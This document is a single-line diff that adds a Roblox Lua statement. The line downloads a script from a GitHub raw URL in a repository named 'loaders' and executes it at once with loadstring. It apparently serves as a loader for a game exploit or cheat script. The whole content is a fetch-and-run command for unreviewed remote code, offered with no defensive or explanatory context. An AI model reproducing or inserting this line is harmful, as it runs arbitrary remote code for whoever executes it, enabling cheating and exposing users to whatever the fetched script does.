@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/it-hears-the-water-dont-splash-spam3-fok862pgo3lrgo.lua"))()
